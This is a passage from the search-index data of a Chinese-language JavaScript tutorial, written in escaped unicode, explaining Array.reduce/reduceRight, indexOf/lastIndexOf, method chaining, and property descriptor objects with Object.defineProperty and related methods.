\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u6570\u7ec4\u6bcf\u4e2a\u6210\u5458\u90fd\u4f1a\u4f9d\u6b21\u6267\u884c\u8fd9\u4e2a\u51fd\u6570\u3002\u5982\u679c\u6570\u7ec4\u6709 n \u4e2a\u6210\u5458\uff0c\u8fd9\u4e2a\u53c2\u6570\u51fd\u6570\u5c31\u4f1a\u6267\u884c n - 1 \u6b21\u3002 \u7b2c\u4e00\u6b21\u6267\u884c\uff1a a \u662f\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u6210\u5458 1 \uff0c b \u662f\u6570\u7ec4\u7684\u7b2c\u4e8c\u4e2a\u6210\u5458 2 \u3002 \u7b2c\u4e8c\u6b21\u6267\u884c\uff1a a \u4e3a\u4e0a\u4e00\u8f6e\u7684\u8fd4\u56de\u503c 3 \uff0c b \u4e3a\u7b2c\u4e09\u4e2a\u6210\u5458 3 \u3002 \u7b2c\u4e09\u6b21\u6267\u884c\uff1a a \u4e3a\u4e0a\u4e00\u8f6e\u7684\u8fd4\u56de\u503c 6 \uff0c b \u4e3a\u7b2c\u56db\u4e2a\u6210\u5458 4 \u3002 \u7b2c\u56db\u6b21\u6267\u884c\uff1a a \u4e3a\u4e0a\u4e00\u8f6e\u8fd4\u56de\u503c 10 \uff0c b \u4e3a\u7b2c\u4e94\u4e2a\u6210\u5458 5 \u3002\u81f3\u6b64\u6240\u6709\u6210\u5458\u904d\u5386\u5b8c\u6210\uff0c\u6574\u4e2a\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u5c31\u662f\u6700\u540e\u4e00\u8f6e\u7684\u8fd4\u56de\u503c 15 \u3002 reduce() \u65b9\u6cd5\u548c reduceRight() \u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u90fd\u662f\u4e00\u4e2a\u51fd\u6570\u3002\u8be5\u51fd\u6570\u63a5\u53d7\u4ee5\u4e0b\u56db\u4e2a\u53c2\u6570\u3002 \u7d2f\u79ef\u53d8\u91cf\u3002\u7b2c\u4e00\u6b21\u6267\u884c\u65f6\uff0c\u9ed8\u8ba4\u4e3a\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u6210\u5458\uff1b\u4ee5\u540e\u6bcf\u6b21\u6267\u884c\u65f6\uff0c\u90fd\u662f\u4e0a\u4e00\u8f6e\u7684\u8fd4\u56de\u503c\u3002 \u5f53\u524d\u53d8\u91cf\u3002\u7b2c\u4e00\u6b21\u6267\u884c\u65f6\uff0c\u9ed8\u8ba4\u4e3a\u6570\u7ec4\u7684\u7b2c\u4e8c\u4e2a\u6210\u5458\uff1b\u4ee5\u540e\u6bcf\u6b21\u6267\u884c\u65f6\uff0c\u90fd\u662f\u4e0b\u4e00\u4e2a\u6210\u5458\u3002 \u5f53\u524d\u4f4d\u7f6e\u3002\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff08\u5f53\u524d\u53d8\u91cf\uff09\u7684\u4f4d\u7f6e\uff0c\u9ed8\u8ba4\u4e3a 1 \u3002 \u539f\u6570\u7ec4\u3002 \u8fd9\u56db\u4e2a\u53c2\u6570\u4e4b\u4e2d\uff0c\u53ea\u6709\u524d\u4e24\u4e2a\u662f\u5fc5\u987b\u7684\uff0c\u540e\u4e24\u4e2a\u5219\u662f\u53ef\u9009\u7684\u3002 1 2 3 4 5 6 7 [ 1 , 2 , 3 , 4 , 5 ]. reduce ( function ( a , // \u7d2f\u79ef\u53d8\u91cf\uff0c\u5fc5\u987b b , // \u5f53\u524d\u53d8\u91cf\uff0c\u5fc5\u987b i , // \u5f53\u524d\u4f4d\u7f6e\uff0c\u53ef\u9009 arr // \u539f\u6570\u7ec4\uff0c\u53ef\u9009 ) { // ... ... \u5982\u679c\u8981\u5bf9\u7d2f\u79ef\u53d8\u91cf\u6307\u5b9a\u521d\u503c\uff0c\u53ef\u4ee5\u628a\u5b83\u653e\u5728 reduce() \u65b9\u6cd5\u548c reduceRight() \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u3002 1 2 3 4 [ 1 , 2 , 3 , 4 , 5 ]. reduce ( function ( a , b ) { return a + b ; }, 10 ); // 25 \u4e0a\u9762\u4ee3\u7801\u6307\u5b9a\u53c2\u6570 a \u7684\u521d\u503c\u4e3a10\uff0c\u6240\u4ee5\u6570\u7ec4\u4ece10\u5f00\u59cb\u7d2f\u52a0\uff0c\u6700\u7ec8\u7ed3\u679c\u4e3a25\u3002\u6ce8\u610f\uff0c\u8fd9\u65f6 b \u662f\u4ece\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u6210\u5458\u5f00\u59cb\u904d\u5386\uff0c\u53c2\u6570\u51fd\u6570\u4f1a\u6267\u884c5\u6b21\u3002 \u5efa\u8bae\u603b\u662f\u52a0\u4e0a\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u8fd9\u6837\u6bd4\u8f83\u7b26\u5408\u76f4\u89c9\uff0c\u6bcf\u4e2a\u6570\u7ec4\u6210\u5458\u90fd\u4f1a\u4f9d\u6b21\u6267\u884c reduce() \u65b9\u6cd5\u7684\u53c2\u6570\u51fd\u6570\u3002\u53e6\u5916\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u53ef\u4ee5\u9632\u6b62\u7a7a\u6570\u7ec4\u62a5\u9519\u3002 1 2 3 4 5 6 7 8 function add ( prev , cur ) { return prev + cur ; } []. reduce ( add ) // TypeError: Reduce of empty array with no initial value []. reduce ( add , 1 ) // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e\u7a7a\u6570\u7ec4\u53d6\u4e0d\u5230\u7d2f\u79ef\u53d8\u91cf\u7684\u521d\u59cb\u503c\uff0c reduce() \u65b9\u6cd5\u4f1a\u62a5\u9519\u3002\u8fd9\u65f6\uff0c\u52a0\u4e0a\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5c31\u80fd\u4fdd\u8bc1\u603b\u662f\u4f1a\u8fd4\u56de\u4e00\u4e2a\u503c\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a reduceRight() \u65b9\u6cd5\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 function subtract ( prev , cur ) { return prev - cur ; } [ 3 , 2 , 1 ]. reduce ( subtract ) // 0 [ 3 , 2 , 1 ]. reduceRight ( subtract ) // -4 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c reduce() \u65b9\u6cd5\u76f8\u5f53\u4e8e 3 \u51cf\u53bb 2 \u518d\u51cf\u53bb 1 \uff0c reduceRight \u65b9\u6cd5\u76f8\u5f53\u4e8e 1 \u51cf\u53bb 2 \u518d\u51cf\u53bb 3 \u3002 \u7531\u4e8e\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u4f1a\u904d\u5386\u6570\u7ec4\uff0c\u6240\u4ee5\u5b9e\u9645\u4e0a\u53ef\u4ee5\u7528\u6765\u505a\u4e00\u4e9b\u904d\u5386\u76f8\u5173\u7684\u64cd\u4f5c\u3002\u6bd4\u5982\uff0c\u627e\u51fa\u5b57\u7b26\u957f\u5ea6\u6700\u957f\u7684\u6570\u7ec4\u6210\u5458\u3002 1 2 3 4 5 6 7 function findLongest ( entries ) { return entries . reduce ( function ( longest , entry ) { return entry . length > longest . length ? entry : longest ; }, '' ); } findLongest ([ 'aaa' , 'bb' , 'c' ]) // \"aaa\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c reduce() \u7684\u53c2\u6570\u51fd\u6570\u4f1a\u5c06\u5b57\u7b26\u957f\u5ea6\u8f83\u957f\u7684\u90a3\u4e2a\u6570\u7ec4\u6210\u5458\uff0c\u4f5c\u4e3a\u7d2f\u79ef\u503c\u3002\u8fd9\u5bfc\u81f4\u904d\u5386\u6240\u6709\u6210\u5458\u4e4b\u540e\uff0c\u7d2f\u79ef\u503c\u5c31\u662f\u5b57\u7b26\u957f\u5ea6\u6700\u957f\u7684\u90a3\u4e2a\u6210\u5458\u3002","title":"reduce()\uff0creduceRight()"},{"location":"stdlib/array/#indexoflastindexof","text":"indexOf \u65b9\u6cd5\u8fd4\u56de\u7ed9\u5b9a\u5143\u7d20\u5728\u6570\u7ec4\u4e2d\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e\uff0c\u5982\u679c\u6ca1\u6709\u51fa\u73b0\u5219\u8fd4\u56de -1 \u3002 1 2 3 4 var a = [ 'a' , 'b' , 'c' ]; a . indexOf ( 'b' ) // 1 a . indexOf ( 'y' ) // -1 indexOf \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u641c\u7d22\u7684\u5f00\u59cb\u4f4d\u7f6e\u3002 1 [ 'a' , 'b' , 'c' ]. indexOf ( 'a' , 1 ) // -1 \u4e0a\u9762\u4ee3\u7801\u4ece1\u53f7\u4f4d\u7f6e\u5f00\u59cb\u641c\u7d22\u5b57\u7b26 a \uff0c\u7ed3\u679c\u4e3a -1 \uff0c\u8868\u793a\u6ca1\u6709\u641c\u7d22\u5230\u3002 lastIndexOf \u65b9\u6cd5\u8fd4\u56de\u7ed9\u5b9a\u5143\u7d20\u5728\u6570\u7ec4\u4e2d\u6700\u540e\u4e00\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e\uff0c\u5982\u679c\u6ca1\u6709\u51fa\u73b0\u5219\u8fd4\u56de -1 \u3002 1 2 3 var a = [ 2 , 5 , 9 , 2 ]; a . lastIndexOf ( 2 ) // 3 a . lastIndexOf ( 7 ) // -1 \u6ce8\u610f\uff0c\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u4e0d\u80fd\u7528\u6765\u641c\u7d22 NaN \u7684\u4f4d\u7f6e\uff0c\u5373\u5b83\u4eec\u65e0\u6cd5\u786e\u5b9a\u6570\u7ec4\u6210\u5458\u662f\u5426\u5305\u542b NaN \u3002 1 2 [ NaN ]. indexOf ( NaN ) // -1 [ NaN ]. lastIndexOf ( NaN ) // -1 \u8fd9\u662f\u56e0\u4e3a\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u5185\u90e8\uff0c\u4f7f\u7528\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 === \uff09\u8fdb\u884c\u6bd4\u8f83\uff0c\u800c NaN \u662f\u552f\u4e00\u4e00\u4e2a\u4e0d\u7b49\u4e8e\u81ea\u8eab\u7684\u503c\u3002","title":"indexOf()\uff0clastIndexOf()"},{"location":"stdlib/array/#_4","text":"\u4e0a\u9762\u8fd9\u4e9b\u6570\u7ec4\u65b9\u6cd5\u4e4b\u4e2d\uff0c\u6709\u4e0d\u5c11\u8fd4\u56de\u7684\u8fd8\u662f\u6570\u7ec4\uff0c\u6240\u4ee5\u53ef\u4ee5\u94fe\u5f0f\u4f7f\u7528\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 var users = [ { name : 'tom' , email : 'tom@example.com' }, { name : 'peter' , email : 'peter@example.com' } ]; users . map ( function ( user ) { return user . email ; }) . filter ( function ( email ) { return /^t/ . test ( email ); }) . forEach ( function ( email ) { console . log ( email ); }); // \"tom@example.com\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5148\u4ea7\u751f\u4e00\u4e2a\u6240\u6709 Email \u5730\u5740\u7ec4\u6210\u7684\u6570\u7ec4\uff0c\u7136\u540e\u518d\u8fc7\u6ee4\u51fa\u4ee5 t \u5f00\u5934\u7684 Email \u5730\u5740\uff0c\u6700\u540e\u5c06\u5b83\u6253\u5370\u51fa\u6765\u3002","title":"\u94fe\u5f0f\u4f7f\u7528"},{"location":"stdlib/array/#_5","text":"Nicolas Bevacqua, Fun with JavaScript Native Array Functions","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"stdlib/attributes/","text":"\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61 \u00b6 \u6982\u8ff0 \u00b6 JavaScript \u63d0\u4f9b\u4e86\u4e00\u4e2a\u5185\u90e8\u6570\u636e\u7ed3\u6784\uff0c\u7528\u6765\u63cf\u8ff0\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u63a7\u5236\u5b83\u7684\u884c\u4e3a\uff0c\u6bd4\u5982\u8be5\u5c5e\u6027\u662f\u5426\u53ef\u5199\u3001\u53ef\u904d\u5386\u7b49\u7b49\u3002\u8fd9\u4e2a\u5185\u90e8\u6570\u636e\u7ed3\u6784\u79f0\u4e3a\u201c\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u201d\uff08attributes object\uff09\u3002\u6bcf\u4e2a\u5c5e\u6027\u90fd\u6709\u81ea\u5df1\u5bf9\u5e94\u7684\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\uff0c\u4fdd\u5b58\u8be5\u5c5e\u6027\u7684\u4e00\u4e9b\u5143\u4fe1\u606f\u3002 \u4e0b\u9762\u662f\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u7684\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 { value : 123 , writable : false , enumerable : true , configurable : false , get : undefined , set : undefined } \u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u63d0\u4f9b6\u4e2a\u5143\u5c5e\u6027\u3002 \uff081\uff09 value value \u662f\u8be5\u5c5e\u6027\u7684\u5c5e\u6027\u503c\uff0c\u9ed8\u8ba4\u4e3a undefined \u3002 \uff082\uff09 writable writable \u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5c5e\u6027\u503c\uff08value\uff09\u662f\u5426\u53ef\u6539\u53d8\uff08\u5373\u662f\u5426\u53ef\u5199\uff09\uff0c\u9ed8\u8ba4\u4e3a true \u3002 \uff083\uff09 enumerable enumerable \u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u5c5e\u6027\u662f\u5426\u53ef\u904d\u5386\uff0c\u9ed8\u8ba4\u4e3a true \u3002\u5982\u679c\u8bbe\u4e3a false \uff0c\u4f1a\u4f7f\u5f97\u67d0\u4e9b\u64cd\u4f5c\uff08\u6bd4\u5982 for...in \u5faa\u73af\u3001 Object.keys() \uff09\u8df3\u8fc7\u8be5\u5c5e\u6027\u3002 \uff084\uff09 configurable configurable \u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5c5e\u6027\u7684\u53ef\u914d\u7f6e\u6027\uff0c\u9ed8\u8ba4\u4e3a true \u3002\u5982\u679c\u8bbe\u4e3a false \uff0c\u5c06\u963b\u6b62\u67d0\u4e9b\u64cd\u4f5c\u6539\u5199\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\uff0c\u6bd4\u5982\u65e0\u6cd5\u5220\u9664\u8be5\u5c5e\u6027\uff0c\u4e5f\u4e0d\u5f97\u6539\u53d8\u5404\u79cd\u5143\u5c5e\u6027\uff08 value \u5c5e\u6027\u9664\u5916\uff09\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c configurable \u5c5e\u6027\u63a7\u5236\u4e86\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u7684\u53ef\u5199\u6027\u3002 \uff085\uff09 get get \u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u8868\u793a\u8be5\u5c5e\u6027\u7684\u53d6\u503c\u51fd\u6570\uff08getter\uff09\uff0c\u9ed8\u8ba4\u4e3a undefined \u3002 \uff086\uff09 set set \u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u8868\u793a\u8be5\u5c5e\u6027\u7684\u5b58\u503c\u51fd\u6570\uff08setter\uff09\uff0c\u9ed8\u8ba4\u4e3a undefined \u3002 Object.getOwnPropertyDescriptor() \u00b6 Object.getOwnPropertyDescriptor() \u65b9\u6cd5\u53ef\u4ee5\u83b7\u53d6\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u3002\u5b83\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u76ee\u6807\u5bf9\u8c61\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5bf9\u5e94\u76ee\u6807\u5bf9\u8c61\u7684\u67d0\u4e2a\u5c5e\u6027\u540d\u3002 1 2 3 4 5 6 7 8 var obj = { p : 'a' }; Object . getOwnPropertyDescriptor ( obj , 'p' ) // Object { value: \"a\", // writable: true, // enumerable: true, // configurable: true // } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Object.getOwnPropertyDescriptor() \u65b9\u6cd5\u83b7\u53d6 obj.p \u7684\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u3002 \u6ce8\u610f\uff0c Object.getOwnPropertyDescriptor() \u65b9\u6cd5\u53ea\u80fd\u7528\u4e8e\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u4e0d\u80fd\u7528\u4e8e\u7ee7\u627f\u7684\u5c5e\u6027\u3002 1 2 3 4 var obj = { p : 'a' }; Object . getOwnPropertyDescriptor ( obj , 'toString' ) // undefined \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c toString \u662f obj \u5bf9\u8c61\u7ee7\u627f\u7684\u5c5e\u6027\uff0c Object.getOwnPropertyDescriptor() \u65e0\u6cd5\u83b7\u53d6\u3002 Object.getOwnPropertyNames() \u00b6 Object.getOwnPropertyNames \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u662f\u53c2\u6570\u5bf9\u8c61\u81ea\u8eab\u7684\u5168\u90e8\u5c5e\u6027\u7684\u5c5e\u6027\u540d\uff0c\u4e0d\u7ba1\u8be5\u5c5e\u6027\u662f\u5426\u53ef\u904d\u5386\u3002 1 2 3 4 5 6 7 var obj = Object . defineProperties ({}, { p1 : { value : 1 , enumerable : true }, p2 : { value : 2 , enumerable : false } }); Object . getOwnPropertyNames ( obj ) // [\"p1\", \"p2\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.p1 \u662f\u53ef\u904d\u5386\u7684\uff0c obj.p2 \u662f\u4e0d\u53ef\u904d\u5386\u7684\u3002 Object.getOwnPropertyNames \u4f1a\u5c06\u5b83\u4eec\u90fd\u8fd4\u56de\u3002 \u8fd9\u8ddf Object.keys \u7684\u884c\u4e3a\u4e0d\u540c\uff0c Object.keys \u53ea\u8fd4\u56de\u5bf9\u8c61\u81ea\u8eab\u7684\u53ef\u904d\u5386\u5c5e\u6027\u7684\u5168\u90e8\u5c5e\u6027\u540d\u3002 1 2 3 4 5 6 7 8 9 10 11 12 Object . keys ([]) // [] Object . getOwnPropertyNames ([]) // [ 'length' ] Object . keys ( Object . prototype ) // [] Object . getOwnPropertyNames ( Object . prototype ) // ['hasOwnProperty', // 'valueOf', // 'constructor', // 'toLocaleString', // 'isPrototypeOf', // 'propertyIsEnumerable', // 'toString'] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u7ec4\u81ea\u8eab\u7684 length \u5c5e\u6027\u662f\u4e0d\u53ef\u904d\u5386\u7684\uff0c Object.keys \u4e0d\u4f1a\u8fd4\u56de\u8be5\u5c5e\u6027\u3002\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\u7684 Object.prototype \u4e5f\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u6240\u6709\u5b9e\u4f8b\u5bf9\u8c61\u90fd\u4f1a\u7ee7\u627f\u5b83\uff0c\u5b83\u81ea\u8eab\u7684\u5c5e\u6027\u90fd\u662f\u4e0d\u53ef\u904d\u5386\u7684\u3002 Object.defineProperty()\uff0cObject.defineProperties() \u00b6 Object.defineProperty() \u65b9\u6cd5\u5141\u8bb8\u901a\u8fc7\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\uff0c\u5b9a\u4e49\u6216\u4fee\u6539\u4e00\u4e2a\u5c5e\u6027\uff0c\u7136\u540e\u8fd4\u56de\u4fee\u6539\u540e\u7684\u5bf9\u8c61\uff0c\u5b83\u7684\u7528\u6cd5\u5982\u4e0b\u3002 1 Object . defineProperty ( object , propertyName , attributesObject ) Object.defineProperty \u65b9\u6cd5\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\uff0c\u4f9d\u6b21\u5982\u4e0b\u3002 object\uff1a\u5c5e\u6027\u6240\u5728\u7684\u5bf9\u8c61 propertyName\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5c5e\u6027\u540d attributesObject\uff1a\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61 \u4e3e\u4f8b\u6765\u8bf4\uff0c\u5b9a\u4e49 obj.p \u53ef\u4ee5\u5199\u6210\u4e0b\u9762\u8fd9\u6837\u3002 1 2 3 4 5 6 7 8 9 10 11 var obj = Object . defineProperty ({}, 'p' , { value : 123 , writable : false , enumerable : true , configurable : false }); obj . p // 123 obj . p = 246 ; obj . p // 123 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Object.defineProperty() \u65b9\u6cd5\u5b9a\u4e49\u4e86 obj.p \u5c5e\u6027\u3002\u7531\u4e8e\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u7684 writable \u5c5e\u6027\u4e3a false \uff0c\u6240\u4ee5 obj.p \u5c5e\u6027\u4e0d\u53ef\u5199\u3002\u6ce8\u610f\uff0c\u8fd9\u91cc\u7684 Object.defineProperty \u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f {} \uff08\u4e00\u4e2a\u65b0\u5efa\u7684\u7a7a\u5bf9\u8c61\uff09\uff0c p \u5c5e\u6027\u76f4\u63a5\u5b9a\u4e49\u5728\u8fd9\u4e2a\u7a7a\u5bf9\u8c61\u4e0a\u9762\uff0c\u7136\u540e\u8fd4\u56de\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u8fd9\u662f Object.defineProperty() \u7684\u5e38\u89c1\u7528\u6cd5\u3002 \u5982\u679c\u5c5e\u6027\u5df2\u7ecf\u5b58\u5728\uff0c Object.defineProperty() \u65b9\u6cd5\u76f8\u5f53\u4e8e\u66f4\u65b0\u8be5\u5c5e\u6027\u7684\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u3002 \u5982\u679c\u4e00\u6b21\u6027\u5b9a\u4e49\u6216\u4fee\u6539\u591a\u4e2a\u5c5e\u6027\uff0c\u53ef\u4ee5\u4f7f\u7528 Object.defineProperties() \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var obj = Object . defineProperties ({}, { p1 : { value : 123 , enumerable : true }, p2 : { value : 'abc' , enumerable : true }, p3 : { get : function () { return this . p1 + this . p2 }, enumerable : true , configurable : true } }); obj . p1 // 123 obj . p2 // \"abc\" obj . p3 // \"123abc\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Object.defineProperties() \u540c\u65f6\u5b9a\u4e49\u4e86 obj \u5bf9\u8c61\u7684\u4e09\u4e2a\u5c5e\u6027\u3002\u5176\u4e2d\uff0c p3 \u5c5e\u6027\u5b9a\u4e49\u4e86\u53d6\u503c\u51fd\u6570 get \uff0c\u5373\u6bcf\u6b21\u8bfb\u53d6\u8be5\u5c5e\u6027\uff0c\u90fd\u4f1a\u8c03\u7528\u8fd9\u4e2a\u53d6\u503c\u51fd\u6570\u3002 \u6ce8\u610f\uff0c\u4e00\u65e6\u5b9a\u4e49\u4e86\u53d6\u503c\u51fd\u6570 get \uff08\u6216\u5b58\u503c\u51fd\u6570 set \uff09\uff0c\u5c31\u4e0d\u80fd\u5c06 writable \u5c5e\u6027\u8bbe\u4e3a true \uff0c\u6216\u8005\u540c\u65f6\u5b9a\u4e49 value \u5c5e\u6027\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 var obj = {}; Object . defineProperty ( obj , 'p' , { value : 123 , get : function () { return 456 ; } }); // TypeError: Invalid property. // A property cannot both have accessors and be writable or have a value Object . defineProperty ( obj , 'p' , { writable : true , get : function () { return 456 ; } }); // TypeError: Invalid property descriptor. // Cannot both specify accessors and a value or writable attribute \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u540c\u65f6\u5b9a\u4e49\u4e86 get \u5c5e\u6027\u548c value \u5c5e\u6027\uff0c\u4ee5\u53ca\u5c06 writable \u5c5e\u6027\u8bbe\u4e3a true \uff0c\u5c31\u4f1a\u62a5\u9519\u3002 Object.defineProperty() \u548c Object.defineProperties() \u53c2\u6570\u91cc\u9762\u7684\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\uff0c writable \u3001 configurable \u3001 enumerable \u8fd9\u4e09\u4e2a\u5c5e\u6027\u7684\u9ed8\u8ba4\u503c\u90fd\u4e3a false \u3002 1 2 3 4 5 6 7 8 9 var obj = {}; Object . defineProperty ( obj , 'foo' , {}); Object . getOwnPropertyDescriptor ( obj , 'foo' ) // { // value: undefined, // writable: false, // enumerable: false, // configurable: false // } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b9a\u4e49 obj.foo \u65f6\u7528\u4e86\u4e00\u4e2a\u7a7a\u7684\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\uff0c\u5c31\u53ef\u4ee5\u770b\u5230\u5404\u4e2a\u5143\u5c5e\u6027\u7684\u9ed8\u8ba4\u503c\u3002 Object.prototype.propertyIsEnumerable() \u00b6 \u5b9e\u4f8b\u5bf9\u8c61\u7684 propertyIsEnumerable() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u7528\u6765\u5224\u65ad\u67d0\u4e2a\u5c5e\u6027\u662f\u5426\u53ef\u904d\u5386\u3002\u6ce8\u610f\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u53ea\u80fd\u7528\u4e8e\u5224\u65ad\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u5bf9\u4e8e\u7ee7\u627f\u7684\u5c5e\u6027\u4e00\u5f8b\u8fd4\u56de false \u3002 1 2 3 4 5 var obj = {}; obj . p = 123 ; obj . propertyIsEnumerable ( 'p' ) // true obj . propertyIsEnumerable ( 'toString' ) // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.p \u662f\u53ef\u904d\u5386\u7684\uff0c\u800c obj.toString \u662f\u7ee7\u627f\u7684\u5c5e\u6027\u3002 \u5143\u5c5e\u6027 \u00b6 \u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u7684\u5404\u4e2a\u5c5e\u6027\u79f0\u4e3a\u201c\u5143\u5c5e\u6027\u201d\uff0c\u56e0\u4e3a\u5b83\u4eec\u53ef\u4ee5\u770b\u4f5c\u662f\u63a7\u5236\u5c5e\u6027\u7684\u5c5e\u6027\u3002 value \u00b6 value \u5c5e\u6027\u662f\u76ee\u6807\u5c5e\u6027\u7684\u503c\u3002 1 2 3 4 5 6 7 8 var obj = {}; obj . p = 123 ; Object . getOwnPropertyDescriptor ( obj , 'p' ). value // 123 Object . defineProperty ( obj , 'p' , { value : 246 }); obj . p // 246 \u4e0a\u9762\u4ee3\u7801\u662f\u901a\u8fc7 value \u5c5e\u6027\uff0c\u8bfb\u53d6\u6216\u6539\u5199 obj.p \u7684\u4f8b\u5b50\u3002 writable \u00b6 writable \u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u51b3\u5b9a\u4e86\u76ee\u6807\u5c5e\u6027\u7684\u503c\uff08value\uff09\u662f\u5426\u53ef\u4ee5\u88ab\u6539\u53d8\u3002 1 2 3 4 5 6 7 8 9 10 var obj = {}; Object . defineProperty ( obj , 'a' , { value : 37 , writable : false }); obj . a // 37 obj . a = 25 ; obj . a // 37 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.a \u7684 writable \u5c5e\u6027\u662f false \u3002\u7136\u540e\uff0c\u6539\u53d8 obj.a \u7684\u503c\uff0c\u4e0d\u4f1a\u6709\u4efb\u4f55\u6548\u679c\u3002 \u6ce8\u610f\uff0c\u6b63\u5e38\u6a21\u5f0f\u4e0b\uff0c\u5bf9 writable \u4e3a false \u7684\u5c5e\u6027\u8d4b\u503c\u4e0d\u4f1a\u62a5\u9519\uff0c\u53ea\u4f1a\u9ed8\u9ed8\u5931\u8d25\u3002\u4f46\u662f\uff0c\u4e25\u683c\u6a21\u5f0f\u4e0b\u4f1a\u62a5\u9519\uff0c\u5373\u4f7f\u5bf9 a \u5c5e\u6027\u91cd\u65b0\u8d4b\u4e88\u4e00\u4e2a\u540c\u6837\u7684\u503c\u3002 1 2 3 4 5 6 7 8 9 10 'use strict' ; var obj = {}; Object . defineProperty ( obj , 'a' , { value : 37 , writable : false }); obj . a = 37 ; // Uncaught TypeError: Cannot assign to read only property 'a' of object \u4e0a\u9762\u4ee3\u7801\u662f\u4e25\u683c\u6a21\u5f0f\uff0c\u5bf9 obj.a \u4efb\u4f55\u8d4b\u503c\u884c\u4e3a\u90fd\u4f1a\u62a5\u9519\u3002 \u5982\u679c\u539f\u578b\u5bf9\u8c61\u7684\u67d0\u4e2a\u5c5e\u6027\u7684 writable \u4e3a false \uff0c\u90a3\u4e48\u5b50\u5bf9\u8c61\u5c06\u65e0\u6cd5\u81ea\u5b9a\u4e49\u8fd9\u4e2a\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 var proto = Object . defineProperty ({}, 'foo' , { value : 'a' , writable : false }); var obj = Object . create ( proto ); obj . foo = 'b' ; obj . foo // 'a' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c proto 